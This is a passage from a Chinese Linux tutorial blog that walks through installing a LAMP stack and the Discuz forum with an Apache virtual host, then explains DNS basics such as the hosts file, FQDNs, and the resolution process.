<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@apache ~]# sed -ri '/^SELINUX=/cSELINUX=disabled' /etc/selinux/config </span><br><span class="line">[root@apache ~]# setenforce 0</span><br><span class="line">[root@apache ~]# systemctl stop firewalld.service </span><br><span class="line">[root@apache ~]# systemctl disable firewalld.service</span><br></pre></td></tr></table></figure>

<p>2.安装LAMP</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@apache ~]# yum -y install httpd mariadb-server mariadb php php-mysql gd php-gd</span><br><span class="line">[root@apache ~]# systemctl start httpd mariadb</span><br><span class="line">[root@apache ~]# systemctl enable httpd mariadb</span><br></pre></td></tr></table></figure>

<p>3.安装Discuz</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### 1. 导入discuz网站源码</span></span></span><br><span class="line">[root@apache ~]# wget http://download.comsenz.com/DiscuzX/2.5/Discuz_X2.5_SC_UTF8.zip</span><br><span class="line"></span><br><span class="line">[root@apache ~]# mkdir    -p      /webroot/discuz</span><br><span class="line">[root@apache ~]# yum  install  -y   unzip</span><br><span class="line">[root@apache ~]#unzip  Discuz_X2.5_SC_UTF8.zip</span><br><span class="line">[root@apache ~]#cp -rf upload/* /webroot/discuz/</span><br><span class="line">[root@apache ~]#chown -R  apache.apache  /webroot/discuz/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### 2. Apache 配置虚拟主机</span></span></span><br><span class="line">[root@apache ~]# vim /etc/httpd/conf.d/discuz.conf</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line"> ServerName www.discuz.com</span><br><span class="line"> DocumentRoot /webroot/discuz</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line">&lt;Directory "/webroot/discuz"&gt;</span><br><span class="line"> Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">[root@apache ~]# systemctl restart httpd</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### 3. 准备数据库</span></span></span><br><span class="line">[root@localhost discuz]# mysql</span><br><span class="line">MariaDB [(none)]&gt; create database discuz ;</span><br><span class="line">切记创建数据库要再敲一遍，可以检查是否创建成功</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###4. 安装discuz [任何client]  过程略</span></span></span><br><span class="line">客户端测试时，添加域名解析</span><br><span class="line">[root@localhost  ~]# vim /etc/hosts</span><br><span class="line">192.168.122.161  www.discuz.com</span><br></pre></td></tr></table></figure>

<p>4.客户端测试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#  Linux客户端域名解析</span></span></span><br><span class="line">[root@apache ~]# vim   /etc/hosts</span><br><span class="line">10.0.128.118  www.a.org</span><br><span class="line">10.0.128.118  www.b.org</span><br><span class="line">10.0.128.118  www.discuz.com</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#	Linux客户端测试网站可用性</span></span></span><br><span class="line">字符测试</span><br><span class="line">[root@apache ~]# yum install -y elinks</span><br><span class="line">[root@apache ~]# elinks http:// www.discuz.com</span><br><span class="line">图形测试：通过火狐浏览器，访问网站地址http:// www.discuz.com</span><br></pre></td></tr></table></figure>

<h1 id="⑱Linux域名服务"><a href="#⑱Linux域名服务" class="headerlink" title="⑱Linux域名服务"></a>⑱Linux域名服务</h1><h2 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h2><p><strong>1.hosts文件  /etc/hosts</strong></p>
<p>作用： 实现名字解析，主要为本地主机名、集群节点提供快速解析</p>
<p>数据库： 平面式结构，集中式数据库</p>
<p>缺点：不便于查询，更新</p>
<p><strong>2.域名系统DNS</strong></p>
<p>作用： 实现名字解析（例如将主机名解析为IP）</p>
<p>（分布式，层次性）</p>
<p><strong>3.FQDN</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">FQDN：(Fully Qualified Domain Name)完全合格域名/全称域名</span><br><span class="line">	baidu.com.</span><br><span class="line">	www.baidu.com.</span><br><span class="line">	www.music.baidu.com.</span><br><span class="line">	www.icbc.com.cn.</span><br><span class="line">	主机名.四级域.三级域.二级域.顶级域.（根域）</span><br></pre></td></tr></table></figure>

<p>命名空间：图示</p>
<img src= "/img/loading.gif" data-src="/2018/04/16/linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20200717215809748.png" alt="image-20200717215809748" style="zoom: 67%;">

<p><img src= "/img/loading.gif" data-src="/2018/04/16/linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20200717220303787.png" alt="image-20200717220303787"></p>
<p><img src= "/img/loading.gif" data-src="/2018/04/16/linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20200717220310840.png" alt="image-20200717220310840"></p>
<p><strong>4.DNS解析流程</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如客户端解析 www.126.com</span><br><span class="line">1. 客户端查询自己的缓存（包含hosts中的记录），如果没有将查询发送&#x2F;etc&#x2F;resolv.conf中的DNS服务器</span><br><span class="line"></span><br><span class="line">2. 如果本地DNS服务器对于请求的信息具有权威性，会将（权威答案）发送到客户端。</span><br><span class="line"></span><br><span class="line">3. 否则（不具有权威性），如果DNS服务器在其缓存中有请求信息，则将（非权威答案）发送到客户端 </span><br><span class="line"></span><br><span class="line">4. 如果缓存中没有该查询信息，DNS服务器将搜索权威DNS服务器以查找信息：</span><br><span class="line">a. 从根区域开始，按照DNS层次结构向下搜索，直至对于信息具有权威的名称服务器，为客户端获答案</span><br><span class="line">DNS服务器将信息传递给客户端 ，并在自己的缓存中保留一个副本，以备以后查找。</span><br><span class="line">b. 转发到其它DNS服务器</span><br></pre></td></tr></table></figure>

<p><strong>5.正向解析/反向解析</strong></p>
<p>​    DNS服务主要起到两个作用：<br>​    　　1）可以把相对应的域名解析为对应的IP地址，这叫正向解析。<br>​    　　2）可以把相对应的IP地址解析为对应的域名，这叫反向解析。（反垃圾邮件）</p>
<p>服务器类型：主服务器、从服务器、缓存服务器</p>
<h2 id="二、DNS域名解析示例"><a href="#二、DNS域名解析示例" class="headerlink" title="二、DNS域名解析示例"></a>二、DNS域名解析示例</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.DNS本地缓存记录</span><br><span class="line"><span class="meta">#</span><span class="bash"> vim   /etc/hosts</span></span><br><span class="line">192.168.142.129  www.memeda.com</span><br><span class="line"></span><br><span class="line">2.主机测试</span><br><span class="line"><span class="meta">#</span><span class="bash">ping   www.memeda.com</span></span><br><span class="line"><span class="meta">#</span><span class="bash">elinks  http://www.memeda.com</span></span><br><span class="line"></span><br><span class="line">3.网站服务器辅助验证</span><br><span class="line"><span class="meta">#</span><span class="bash">yum  install -y  httpd</span></span><br><span class="line"><span class="meta">#</span><span class="bash">systemctl start  httpd</span></span><br><span class="line"><span class="meta">#</span><span class="bash">systemctl   stop   firewalld</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">echo</span>  memeda  &gt; /var/www/html/index.html</span></span><br></pre></td></tr></table></figure>

<h2 id="三、ISP阿里域名申请及解析-略"><a href="#三、ISP阿里域名申请及解析-略" class="headerlink" title="三、ISP阿里域名申请及解析(略)"></a>三、ISP阿里域名申请及解析(略)</h2>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
</search>
